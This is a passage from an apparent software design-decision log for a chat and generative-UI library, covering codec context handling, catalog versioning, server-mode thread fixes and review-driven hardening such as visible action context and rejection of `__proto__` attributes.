  shares only its name with an app tool throws.
- Every chat has an artifact registry, with or without a catalog. A catalog with no `artifacts`
  config reads the chat's registry.
- `catalogVersion` is a field of `ChatRunRequest`, not a key in `runOptions`. `AgUiCodec` sends
  it in `forwardedProps` in server mode, beside the turn's ids. `runOptions` stays the user's
  choices, copied onto the user message. A retry then sends the current version, not the one of
  the first send.
- A reply records `metadata.catalogVersion` when its turn ends, if it calls a catalog tool, holds
  an `xh.chat.ui` data part, or has a component tag in its text. A document with no version of its
  own takes the version of its message, read untracked. A live reply uses the current catalog, so
  its renderers need not re-render when the version lands.
- A chat with a catalog renders `xh.chat.ui` data parts with no extra config. App data renderers
  take precedence.
- `AgUiCodec` sends the context of the turn's user message as a `context` entry, on each step of
  the turn. Earlier messages' context is not sent: a server-mode backend has seen it, and AG-UI
  has no field for it on a message. `AnthropicCodec` and `ChatCompletionsCodec` add a
  `<message-context>` block after the text of each user message with context, so the whole history
  keeps it.
- `ChatModel` has no `callToolAsync()`. A tool call that the model never made is not valid
  history: the model would see a result for a call it did not make. In server mode, the server
  owns the history and the tool loop, and the browser cannot add a call to it. The `callTool`
  action runs a client tool outside the history, as D47 says.

**Why.** Each keeps the contract of `planning/GENUI-2.md`, and closes a gap that the wiring
leaves open.

**Alternatives.** Always send the document tool. Its schema is a union of every component, which
costs tokens on every step of a chat that never nests components.

## D55. Fixes from review 5 of server mode

**Decision.** Review 5 (`planning/reviews/review-5-server-mode.md`) led to these changes:

- A thread id given with `initialMessages` or `loadMessages()` is the backend's only if the
  messages hold a user message. A greeting alone is not history, so a new thread with a greeting
  still calls its thread creator and adopts the id from `RUN_STARTED`. This amends D39.
- The thread layer keeps a chat open while its turn waits for the user, and lists it in
  `awaitingThreadIds`. A closed chat would lose the question, and the store has no record of it.
- A delete of a thread whose create is in flight waits for the create, and deletes the backend's
  id too.
- In server mode, `AgUiCodec` sends only the client tool calls of a `continue` step, with their
  results. The server wrote the rest of the step and ran its own calls.
- `AnthropicCodec` puts live context at the end of the last user turn, after the history's
  breakpoint. `ChatCompletionsCodec` sends it as a last `user` message. In the system prompt, it
  came before the history, so each change voided the cached history. This replaces the placement
  of D49.
- Sends wait while an undo runs, so that a new turn's tools cannot act on what the undo restores.

**Why.** Each fixes a defect the review found. The scratch tests that confirmed them are now specs.

**Alternatives.** For live context, mid-conversation system messages. Not every gateway accepts a
system message after the first.

## D56. Fixes from review 5 of generative UI

**Decision.** Review 5 (`planning/reviews/review-5-genui-components.md`) led to these changes:

- The `context` of a `send` action is a flat object of at most 8 short values, such as record
  ids. The button's tooltip shows it, and the message view shows it under the sent message. The
  codecs send it to the model. This amends D17: the context is no longer hidden, so it cannot
  carry an instruction the user does not see.
- Component, handler, migration, artifact and data renderer names are looked up as own
  properties. A tag such as `<ui-constructor/>` is an unknown component.
- A tag attribute named `__proto__` fails, and every props schema must have `type: 'object'`.
- A catalog call that has a result but fails its props renders the fallback. A server's display
  tool answers before the browser checks, so the inline status cannot report the failure.
- A view applies only to the rows it gets. `ChatDataHandle.isComplete` says when the first page
  holds them all. `units` scales `number` columns, not `integer` ones.
- A stored tag for an older catalog runs through the migrations before it falls back. The parser
  keeps the name and props of a tag for an unknown component, so a migration can rename it.
- The catalog caches each component segment by its tag, so a tag keeps its props object while the
  text after it streams.
- A `callTool` action waits while the chat is busy, and refuses a tool whose schema the catalog
  cannot check fully. It keeps no undo, as the call is not in the history.
- Shared internal helpers live in the top-level `impl/`, so no package reaches into another's.

**Why.** Each fixes a defect the review found, or closes a gap between the code and its docs.

**Alternatives.** For the context, leave it out of the card's default schema. A button that acts
on a record then has to spell the record's id out in its text.
